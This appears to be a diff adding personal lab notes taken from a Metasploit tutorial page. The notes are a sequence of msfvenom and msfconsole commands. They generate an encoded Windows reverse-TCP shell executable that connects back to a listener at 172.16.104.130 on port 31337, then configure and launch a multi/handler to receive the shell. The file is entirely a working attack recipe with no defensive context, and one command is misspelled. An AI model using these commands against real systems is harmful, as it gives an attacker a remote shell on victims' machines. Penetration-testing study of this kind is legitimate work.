@@ -1,0 +1,13 @@
+https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
+
+msfcenom --payload-options -p windows/shell/reverse_tcp
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+file /tmp/1.exe
+msfconsole -q
+use exploit/multi/handler
+show options
+set payload windows/shell/reverse_tcp
+show options
+set LHOST 172.16.104.130
+set LPORT 31337
+exploit
